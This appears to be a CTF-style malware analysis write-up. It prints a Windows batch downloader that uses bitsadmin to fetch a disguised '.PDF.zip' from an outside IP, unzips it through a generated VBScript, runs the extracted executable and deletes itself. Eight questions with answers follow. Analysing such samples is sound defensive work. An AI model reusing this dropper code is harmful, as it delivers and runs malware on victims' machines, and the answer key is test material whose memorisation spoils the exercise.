> # Batch Downloader

## Summary

```bat
@echo off
bitsadmin /transfer System /Download /Priority FOREGROUND http://193.169.255.78/FW-APGKSDTPX4HOAUJJMBVDNXPOHZ.PDF.zip %TEMP%\FW-APGKSDTPX4HOAUJJMBVDNXPOHZ.PDF.zip
setlocal
cd /d %~dp0
Call :UnZipFile "%TEMP%" "%TEMP%\FW-APGKSDTPX4HOAUJJMBVDNXPOHZ.PDF.zip"
cd /d "%TEMP%"
start "" "FW-APGKSDTPX4HOAUJJMBVDNXPOHZ.PDF.exe"
del %~s0 /q

:UnZipFile <ExtractTo> <newzipfile>
set vbs="%TEMP%\_.vbs"
if exist %vbs% del /f /q %vbs%
>%vbs%  echo Set fso = CreateObject("Scripting.FileSystemObject")
>>%vbs% echo If NOT fso.FolderExists(%1) Then
>>%vbs% echo fso.CreateFolder(%1)
>>%vbs% echo End If
>>%vbs% echo set objShell = CreateObject("Shell.Application")
>>%vbs% echo set FilesInZip=objShell.NameSpace(%2).items
>>%vbs% echo objShell.NameSpace(%1).CopyHere(FilesInZip)
>>%vbs% echo Set fso = Nothing
>>%vbs% echo Set objShell = Nothing
cscript //nologo %vbs%
if exist %vbs% del /f /q %vbs%
```

### Q1. What command is used to prevent the command echoing in the console?
`@echo off` was used to prevent output in console.<br>
**Answer:** @echo off

### Q2. Which tool is used to download a file from a specified URL in the script?
The attacker use `bitsadmin` to download file from `http://193.169.255.78/FW-APGKSDTPX4HOAUJJMBVDNXPOHZ.PDF.zip`.<br>
**Answer:** bitsadmin

### Q3. What is the priority set for the download operation in the script?
/Priority FOREGROUND<br>
**Answer:** FOREGROUND

### Q4. Which command is used to start localization of environment changes in the script?
Use setlocal to change environment variables when you run a batch file. <br>
**Answer:** setlocal

### Q5. Which IP address is used by malicious code?
**Answer:** 193.169.255.78

### Q6. What is the name of the subroutine called to extract the contents of the zip file?
The attacker call `UnZipFile` to unzip the zip file downloaded.<br>
**Answer:** UnZipFile

### Q7. Which command attempts to start an executable file extracted from the zip file?
The attacker use `start` to start PE file named `FW-APGKSDTPX4HOAUJJMBVDNXPOHZ.PDF.exe`.<br>
**Answer:** start "" "FW-APGKSDTPX4HOAUJJMBVDNXPOHZ.PDF.exe"

### Q8. Which scripting language is used to extract the contents of the zip file?<br>
The attacker create file with `.vbs` extension to unzip file, it's VBScript.<br>
**Answer:** VBScript